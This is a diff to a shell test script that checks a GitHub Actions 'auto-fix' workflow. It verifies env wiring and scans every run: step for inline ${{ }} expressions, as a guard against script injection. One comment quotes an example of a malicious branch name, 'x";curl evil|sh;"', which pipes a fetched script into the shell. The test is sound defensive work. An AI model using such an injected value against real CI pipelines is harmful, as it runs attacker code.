@@ -128,6 +128,9 @@ assert_eq "$(step_field "$LOOKUP_STEP" .id)" existing "'$LOOKUP_STEP' id"
 while IFS='|' read -r step key want; do
   assert_eq "$(step_field "$step" ".env.$key")" "$want" "'$step' env $key"
 done <<'WIRING'
+Gather failure context|RUN_ID|${{ inputs.run_id }}
+Gather failure context|BRANCH|${{ inputs.branch }}
+Gather failure context|PR_NUMBER_INPUT|${{ inputs.pr_number }}
 Compute failure signature|CONTEXT_DIR|${{ steps.context.outputs.context_dir }}
 Compute failure signature|WORKFLOW_NAME|${{ inputs.workflow_name }}
 Compute failure signature|BRANCH|${{ inputs.branch }}
@@ -168,11 +171,24 @@ if [ -n "$unresolved_refs" ]; then
   while IFS= read -r problem; do fail "$problem"; done <<<"$unresolved_refs"
 fi
 
-# The new steps read inputs from env:, never from ${{ }} inside the script.
-for f in signature lookup labels; do
+# Every run: body reads inputs from env:, never from ${{ }} inside the
+# script. An expression there is pasted into the script text before bash
+# parses it, so a caller-controlled value such as a branch named
+# `x";curl evil|sh;"` closes the quote and runs (issue #69). Checked per
+# step, so a failure names the offending step. Walked by index, not by
+# name: a by-name lookup reads an unnamed step's body as '' and passes it.
+CASE_NAME=no-inline-expressions
+step_count="$(yq -r '.jobs["auto-fix"].steps | length' "$WORKFLOW")"
+run_seen=0
+for ((i = 0; i < step_count; i++)); do
+  [ "$(I="$i" yq -r '.jobs["auto-fix"].steps[env(I)] | has("run")' "$WORKFLOW")" = true ] || continue
+  run_seen=$((run_seen + 1))
+  label="$(I="$i" yq -r '.jobs["auto-fix"].steps[env(I)].name // "step #" + strenv(I)' "$WORKFLOW")"
   # shellcheck disable=SC2016 # a literal GitHub expression, not a shell one
-  assert_lacks "$(cat "$work/$f.sh")" '${{' "$f run body"
+  assert_lacks "$(I="$i" yq -r '.jobs["auto-fix"].steps[env(I)].run // ""' "$WORKFLOW")" '${{' "'$label' run body"
 done
+ok
+[ "$run_seen" -gt 0 ] || fail "found no run: steps; the scan is not reading the job"
 
 # ---------------------------------------------------------------- signatures
 run_sig() { # <log file or ''> <workflow name> <branch>
